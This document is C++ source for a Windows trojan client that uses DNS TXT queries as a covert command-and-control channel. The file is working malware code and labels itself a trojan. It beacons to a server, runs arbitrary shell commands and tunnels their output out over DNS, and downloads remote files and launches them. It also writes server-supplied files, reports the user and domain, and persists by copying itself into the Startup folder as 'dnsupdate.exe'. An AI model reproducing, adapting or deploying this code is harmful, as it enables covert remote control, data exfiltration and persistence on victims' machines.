#include <algorithm>
#include <deque>
#include <fstream>
#include <iostream>
#include <string>
#include <time.h>
#include <vector>
#include <ws2tcpip.h>
#include <windns.h>
#include "Base64.h"
#include "DNSClient.h"
#include "Splitter.h"
#include "Util.h"
using namespace std;

//#pragma warning(disable:4996)
#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")

enum Op {
	CHECKIN = 0,
	NOP = 1,
	ASSIGN_ID = 2,
	BUFFER = 3,
	EXEC = 4,
	OUTPUT = 5,
	OUTPUT_DONE = 6,
	WRITE_FILE = 7,
	GET_DIR = 8,
	CHANGE_DIR = 9,
	CREATE_PROCESS = 10,
	FETCH_FILE = 11,
	QUERY_USERNAME = 12,
	PERSIST = 13
};

DNSClient::DNSClient()
{
	client_id = 0;
	checkin_interval_ms = 2000;
	send_delay_ms = 500;
}

static Packet create_packet(unsigned char client_id, unsigned char opcode, const string& data)
{
	static unsigned char packet_id = 0;
	if(++packet_id > 255)
		packet_id = 0;

	return Packet(client_id, packet_id, opcode, data);
}

void DNSClient::pack_outbound_queue(unsigned char opcode, string msg)
{
	unsigned int bufflen = 42;

	while(msg.size() % 3 != 0)
		msg += " ";

	string sbuf;
	for(auto it = msg.begin(); it != msg.end(); ++it) {
		sbuf += *it;
		if(sbuf.size() == bufflen) {
			string payload(sbuf);
			outbound_queue.push_back(create_packet(client_id, opcode, payload));
			sbuf.clear();
		}
	}
	
	if(!sbuf.empty())
		outbound_queue.push_back(create_packet(client_id, opcode, sbuf));

	// tell server we're done sending output from last command
	outbound_queue.push_back(create_packet(client_id, Op::OUTPUT_DONE, ""));
}

string DNSClient::get_current_dir()
{
	CHAR buf[MAX_PATH];
	if(GetCurrentDirectoryA(MAX_PATH, buf) > 1)
		return string(buf);
	else
		return "Error in GetCurrentDirectory()";
}

string DNSClient::change_dir(const string& newdir)
{
	if(SetCurrentDirectoryA(newdir.c_str()))
		return "Changed directory to '" + get_current_dir() + "'.";
	else
		return "Directory change failed.";
}

string DNSClient::fetch_file(const string& url)
{
	size_t pos = url.find_last_of('/') + 1;
	string filename = url.substr(pos, string::npos);
	CHAR path[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, path);
	sprintf_s(path, sizeof(path), "%s\\%s", path, filename.c_str());
	HRESULT res = URLDownloadToFileA(NULL, url.c_str(), path, 0, NULL);
	if(res == S_OK)
		return "Download successful.";
	else
		return "Download failed.";
}

string DNSClient::create_process(const string& path)
{
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	if(CreateProcessA(path.c_str(), NULL, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi))
		return "Process created.";
	else
		return "Failed to create process.";
}

void DNSClient::write_file(const string& filename)
{
	string bytes;
	for(auto it = packet_buffer.begin(); it != packet_buffer.end(); ++it)
		bytes += it->data;

	ofstream of(filename.c_str(), ios::out | ios::binary);
	of << de64(bytes);
	of.close();
	packet_buffer.clear();
}

string DNSClient::query_username()
{
	CHAR ubuf[64], dbuf[64], buf[128];
	GetEnvironmentVariableA("USERNAME", ubuf, sizeof(ubuf));
	GetEnvironmentVariableA("USERDOMAIN", dbuf, sizeof(dbuf));
	sprintf_s(buf, sizeof(buf), "%s\\%s", dbuf, ubuf);
	return string(buf);
}

string DNSClient::persist()
{
	CHAR user_profile[512], dest[512];
	GetEnvironmentVariableA("USERPROFILE", user_profile, sizeof(user_profile));
	sprintf_s(dest, sizeof(dest), "%s\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\dnsupdate.exe", user_profile);
	string src(GetCommandLineA());
	src.erase(remove(src.begin(), src.end(), '"'), src.end());

	if(CopyFileA(src.c_str(), dest, FALSE))
		return "Trojan successfully copied to '" + string(dest) + "'.";
	else
		return "Failed to copy trojan. Try manually.";
}

string DNSClient::exec(const string& cmd)
{
	HANDLE stdout_r, stdout_w, stderr_r, stderr_w;
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	CreatePipe(&stderr_r, &stderr_w, &sa, 0);
	SetHandleInformation(stderr_r, HANDLE_FLAG_INHERIT, 0);
	CreatePipe(&stdout_r, &stdout_w, &sa, 0);
	SetHandleInformation(stdout_r, HANDLE_FLAG_INHERIT, 0);

	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFO));

	si.cb = sizeof(STARTUPINFO);
	si.hStdError = stderr_w;
	si.hStdOutput = stdout_w;
	si.dwFlags |= STARTF_USESTDHANDLES;
	
	WCHAR wcmd[MAX_PATH];
	wsprintf(wcmd, L"cmd.exe /c %s", Util::to_wstring(cmd).c_str());
	CreateProcess(NULL, wcmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(stderr_w);
	CloseHandle(stdout_w);

	DWORD dwRead;
	CHAR buf[4096];
	string out = "";
	string err = "";
	BOOL bSuccess = FALSE;

	while(true) {
		bSuccess = ReadFile(stdout_r, buf, 4096, &dwRead, NULL);
		if(!bSuccess || dwRead == 0)
			break;

		string s(buf, dwRead);
		out += s;
	}

	dwRead = 0;
	while (true) {
		bSuccess = ReadFile(stderr_r, buf, 4096, &dwRead, NULL);
		if(!bSuccess || dwRead == 0)
			break;

		string s(buf, dwRead);
		err += s;
	}

	return string(out + err);
}

void DNSClient::sync()
{
	PDNS_RECORD rec;
	DNS_FREE_TYPE ft = DnsFreeRecordListDeep;

	// default to a normal check-in...
	Packet query = create_packet(client_id, Op::CHECKIN, "");

	// ...unless there are outbound packets queued
	if(!outbound_queue.empty()) {
		query = outbound_queue.front();
		outbound_queue.pop_front();
	}

	//printf("lookup: %s\n", query.flatten().c_str());
	DNS_STATUS ds = DnsQuery(Util::to_wstring(query.flatten()).c_str(), DNS_TYPE_TEXT, DNS_QUERY_NO_MULTICAST | DNS_QUERY_BYPASS_CACHE, NULL, &rec, NULL);
	if(ds == NO_ERROR) {
		// store the TXT records
		vector<string> chunks;

		// loop through TXT records and add to vector for later processing
		PDNS_RECORD p = rec;
		while(p && p->wType == DNS_TYPE_TEXT) {
			chunks.push_back(Util::to_string(p->Data.TXT.pStringArray[0]));
			p = p->pNext;
		}

		// cleanup
		DnsRecordListFree(rec, ft);

		string reassembled_payload = Util::order_chunks(chunks);

		vector<string> tokens = Splitter::split(reassembled_payload, ',');
		unsigned char opcode = atoi(tokens[1].c_str());
		string data;

		// if there's a data token, run it through the replace_char function
		// so the client's base64 functions can operate on it, else set to empty
		// (unless it's a URL, in which case don't call replace_char() on it)
		if(tokens.size() > 2) {
			if(opcode != Op::FETCH_FILE)
				data = Util::replace_char(Util::replace_char(tokens[2], '/', '-'), '+', '.');
			else
				data = tokens[2];
		}
		else
			data = "";

		// do stuff based on the opcode
		switch(opcode) {
			case Op::NOP:
				break;

			case Op::ASSIGN_ID:
				client_id = atoi(data.c_str());
				break;

			case Op::EXEC:
				pack_outbound_queue(Op::OUTPUT, exec(de64(data)));
				break;

			case Op::BUFFER:
				packet_buffer.push_back(create_packet(client_id, Op::BUFFER, data)); 
				break;

			case Op::WRITE_FILE:
				write_file(data);
				break;

			case Op::GET_DIR:
				pack_outbound_queue(Op::OUTPUT, get_current_dir());
				break;

			case Op::CHANGE_DIR:
				pack_outbound_queue(Op::OUTPUT, change_dir(data));
				break;

			case Op::CREATE_PROCESS:
				pack_outbound_queue(Op::OUTPUT, create_process(data));
				break;

			case Op::FETCH_FILE:
				pack_outbound_queue(Op::OUTPUT, fetch_file(data));
				break;

			case Op::QUERY_USERNAME:
				outbound_queue.push_back(create_packet(client_id, Op::QUERY_USERNAME, query_username()));
				break;

			case Op::PERSIST:
				pack_outbound_queue(Op::OUTPUT, persist());
				break;
		}
	}
}

int DNSClient::main()
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 2), &wsa);

	while(true) {
		sync();
		if(!outbound_queue.empty())
			Sleep(send_delay_ms);
		else
			Sleep(checkin_interval_ms);
	}

	WSACleanup();

	return 0;
}

//int main(int argc, char** argv)
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	DNSClient c;
	return c.main();
}
